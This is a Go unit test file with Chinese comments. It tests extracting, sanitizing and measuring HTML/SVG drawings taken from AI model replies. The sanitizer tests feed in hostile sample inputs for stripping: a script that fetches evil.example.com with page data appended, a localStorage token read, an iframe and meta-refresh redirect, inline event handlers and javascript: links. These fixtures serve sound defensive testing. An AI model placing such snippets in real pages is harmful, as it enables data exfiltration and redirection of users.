//go:build unit

package service

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestExtractIntelCheckDrawing(t *testing.T) {
	t.Run("从 html 代码块中抽取", func(t *testing.T) {
		reply := "好的，这是实现：\n\n```html\n<html><body><svg><circle r=\"1\"/></svg></body></html>\n```\n\n希望符合要求。"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.True(t, strings.HasPrefix(got, "<html>"))
		require.Contains(t, got, "<svg>")
		require.NotContains(t, got, "希望符合要求")
	})

	t.Run("多个代码块时取最长的一个", func(t *testing.T) {
		reply := "先看一个最小示例：\n```html\n<svg></svg>\n```\n完整版本：\n```html\n<svg><circle r=\"1\"/><rect/><path d=\"M0 0\"/></svg>\n```"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.Contains(t, got, "<circle")
	})

	t.Run("忽略非绘图代码块", func(t *testing.T) {
		reply := "先安装依赖：\n```bash\nnpm install\n```\n再看画作：\n```\n<svg><circle r=\"1\"/></svg>\n```"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.Contains(t, got, "<svg>")
		require.NotContains(t, got, "npm install")
	})

	t.Run("无代码块时抽取裸 html 文档", func(t *testing.T) {
		reply := "结果如下。<!DOCTYPE html><html><body><svg></svg></body></html> 完毕。"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.True(t, strings.HasPrefix(strings.ToLower(got), "<!doctype html"))
		require.NotContains(t, got, "完毕")
	})

	t.Run("最后兜底抽取裸 svg 片段", func(t *testing.T) {
		reply := "画作：<svg viewBox=\"0 0 1 1\"><circle r=\"1\"/></svg>"
		got, err := ExtractIntelCheckDrawing(reply)
		require.NoError(t, err)
		require.True(t, strings.HasPrefix(got, "<svg"))
	})

	t.Run("没有产物时报错", func(t *testing.T) {
		_, err := ExtractIntelCheckDrawing("抱歉，我无法完成这个任务。")
		require.Error(t, err)
	})
}

// TestSanitizeIntelCheckDrawingKeepsAnimation 纯计算脚本必须保留。
// 参考稿的动画正是由 requestAnimationFrame 驱动，一律删脚本会让满血稿失去动画，
// 反而被判成降智——这是本清洗逻辑最关键的取舍。
func TestSanitizeIntelCheckDrawingKeepsAnimation(t *testing.T) {
	source := `<html><head></head><body>
<svg><circle id="sun" r="1"/></svg>
<script>
let t = 0;
function tick() { t += 0.016; document.getElementById("sun").setAttribute("r", 1 + Math.sin(t)); requestAnimationFrame(tick); }
tick();
</script>
</body></html>`

	got, err := SanitizeIntelCheckDrawing(source, 0)
	require.NoError(t, err)
	require.Contains(t, got, "requestAnimationFrame")
	require.Contains(t, got, "Content-Security-Policy")
}

func TestSanitizeIntelCheckDrawingRemovesUnsafe(t *testing.T) {
	tests := []struct {
		name      string
		source    string
		forbidden string
	}{
		{
			name:      "剔除 iframe",
			source:    `<html><body><svg></svg><iframe src="https://evil.example.com"></iframe></body></html>`,
			forbidden: "<iframe",
		},
		{
			name:      "剔除内联事件属性",
			source:    `<html><body><svg><circle r="1" onclick="alert(1)"/></svg></body></html>`,
			forbidden: "onclick",
		},
		{
			name:      "剔除发起网络请求的脚本",
			source:    `<html><body><svg></svg><script>fetch("https://evil.example.com?d=" + document.title);</script></body></html>`,
			forbidden: "fetch(",
		},
		{
			name:      "剔除读取本地存储的脚本",
			source:    `<html><body><svg></svg><script>const v = localStorage.getItem("token"); requestAnimationFrame(() => v);</script></body></html>`,
			forbidden: "localStorage",
		},
		{
			name:      "剔除带 http-equiv 的 meta",
			source:    `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example.com"></head><body><svg></svg></body></html>`,
			forbidden: "refresh",
		},
		{
			name:      "剔除外链地址",
			source:    `<html><body><svg></svg><a href="https://evil.example.com">点我</a></body></html>`,
			forbidden: "evil.example.com",
		},
		{
			name:      "剔除 javascript 伪协议",
			source:    `<html><body><svg></svg><a href="javascript:alert(1)">点我</a></body></html>`,
			forbidden: "javascript:",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := SanitizeIntelCheckDrawing(tt.source, 0)
			require.NoError(t, err)
			require.NotContains(t, got, tt.forbidden)
			// 清洗后仍应是可渲染的文档，且始终带上 CSP 兜底。
			require.Contains(t, got, "Content-Security-Policy")
		})
	}
}

func TestSanitizeIntelCheckDrawingSizeLimit(t *testing.T) {
	source := `<html><body><svg><circle r="1"/></svg></body></html>`

	t.Run("超过上限时报错", func(t *testing.T) {
		_, err := SanitizeIntelCheckDrawing(source, 10)
		require.Error(t, err)
	})

	t.Run("上限为零表示不限制", func(t *testing.T) {
		got, err := SanitizeIntelCheckDrawing(source, 0)
		require.NoError(t, err)
		require.Contains(t, got, "<svg>")
	})
}

// TestSanitizeIntelCheckDrawingPipeline 串起抽取 → 清洗 → 计算指标的完整链路，
// 确认清洗不会破坏后续指标统计。
func TestSanitizeIntelCheckDrawingPipeline(t *testing.T) {
	reply := "这是我的实现：\n\n```html\n" + drawingSampleSMIL + "\n```"

	extracted, err := ExtractIntelCheckDrawing(reply)
	require.NoError(t, err)

	sanitized, err := SanitizeIntelCheckDrawing(extracted, 0)
	require.NoError(t, err)

	metrics, err := ComputeDrawingMetrics(sanitized)
	require.NoError(t, err)
	require.True(t, metrics.HasSVG)
	require.True(t, metrics.HasTitle)
	require.True(t, metrics.HasDesc)
	require.Equal(t, 1, metrics.AnimatedTargets)
	require.True(t, metrics.HasMechanism(DrawingMechanismSMIL))
}
